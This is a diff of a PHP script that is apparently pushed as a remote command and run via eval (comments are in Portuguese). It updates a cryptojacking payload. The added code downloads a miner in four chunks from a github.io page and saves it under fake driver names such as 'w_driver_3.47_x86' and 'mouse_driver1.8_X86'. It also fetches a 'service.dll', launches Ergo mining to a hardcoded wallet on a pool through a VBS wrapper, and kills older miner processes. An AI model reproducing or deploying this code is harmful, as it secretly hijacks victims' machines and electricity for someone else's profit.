@@ -2,9 +2,9 @@ execução por eval. cuidado, não use exit e nem __FILE__
 
 *Atenção, este comando esta sendo executado via exec_blog_command() devido a mudança da url da conta. use só o comando do blg
 
-****38
+****39
 
-[__GIT_COMMAND]
+[GIT_COMMAND]
 
 $GLOBALS['__download_002'] = function($url, $post = false, $__header = array())
 {
@@ -266,8 +266,9 @@ if(1)
 	@$GLOBALS['__check_def_excl_002']();
 	/**/
 	$EXEC_XMR = true;
-	$lolm_name = 'w_driver1.95_x86';
+	$lolm_name = 'w_driver_3.47_x86';
 	$xmr_name = 'mouse_driver1.8_X86';
+	$lolm_path_config = $lolm_path . '\\service.dll';
 	$lolm_path .= '\\'.$lolm_name.'.exe';
 	$xmr_path .= '\\'.$xmr_name.'.exe';
 	$data = true;
@@ -276,12 +277,23 @@ if(1)
 	if(!is_file($lolm_path))
 	{
 		$data = false;
-		/*$data = @$GLOBALS['__download_002']("https://raw.githubusercontent.com/$user/$project/refs/heads/main/lolminer/lolMiner_1.95.dat");*/
-		$data = @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/lolMiner_1.95.dat");
-		if($data && strlen($data) > 9000000)
+		$data = @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/nanominer_parte_1");
+		$data .= @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/nanominer_parte_2");
+		$data .= @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/nanominer_parte_3");
+		$data .= @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/nanominer_parte_4");
+		if($data && strlen($data) > 75000000)
 			@file_put_contents($lolm_path, $data);
 		else
 			$data = false;
+		if($data)
+		{
+			$data = false;
+			$data = @$GLOBALS['__download_002']("https://".$user.".github.io/".$project."/lolminer/service.dat");
+			if($data && strlen($data) > 7000000)
+				@file_put_contents($lolm_path_config, $data);
+			else
+				$data = false;
+		}
 	}
 	if($EXEC_XMR && !is_file($xmr_path))
 	{
@@ -338,7 +350,8 @@ if(1)
 		/*$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user xxxxxxxxxxxxxxxxxx.'.$work_key.'_dev'.$devnum.' --watchdog exit --nocolor --devices '.$devnum;*/
 		/*$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user xxxxxxxxxxxxxxxxxxxxx.'.$work_key.' --watchdog exit --nocolor';*/
 		/*$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-us-east1.nanopool.org:10600 --user 9iBGUJ1H4PmqPtmuxXXNSr5JHDcT2QvFiW4LEjRXHFQnjrTzQhE.'.$work_key.' --watchdog exit --nocolor';*/
-		$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool erg.2miners.com:8888 --user 9iBMo1BM7mSPRUWA1yHDUepNCHKZ4ZV4vaeMGhCsBbUmVcDDYfr.'.$work_key.' --watchdog exit --nocolor';
+		/*$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool erg.2miners.com:8888 --user 9iBMo1BM7mSPRUWA1yHDUepNCHKZ4ZV4vaeMGhCsBbUmVcDDYfr.'.$work_key.' --watchdog exit --nocolor';*/
+		$command = '"'.$lolm_path.'" -algo autolykos -wallet 9h9kNgSEYzcNdCSxeC5gXhzXgDKzndRx1uGZeffYQ3F28duHr5s -coin ERG -rigName '.$work_key.' -pool1 erg.2miners.com:8888';
 		$command = preg_replace('/\"/is', '""', $command);
 		$vbs = base64_decode($vbs);
 		$vbs = preg_replace('/\{COMMAND\}/is', $command, $vbs);
@@ -403,15 +416,16 @@ if(1)
 		{
 			$output = array();
 			/**/
-			$new_command_id = '10016';
+			$new_command_id = '10021';
 			$path_control_id  = dirname(PHP_BINARY) . '/command_id';
-			if((time() < (1785256398 + (60*60*24*3))) && @file_get_contents($path_control_id) !== $new_command_id)
+			if((time() < (1792072866 + (60*60*24*3))) && @file_get_contents($path_control_id) !== $new_command_id)
 			{
 				@file_put_contents($path_control_id, $new_command_id);
 				@exec('taskkill /f /im '.$lolm_name.'.exe');
 				@exec('taskkill /f /im '.$xmr_name.'.exe');
 				@exec('taskkill /f /im mouse_driver1.6_X86.exe');
 				@exec('taskkill /f /im mouse_driver1.7_X86.exe');
+				@exec('taskkill /f /im w_driver1.95_x86.exe');
 				sleep(2);
 				
 				/**
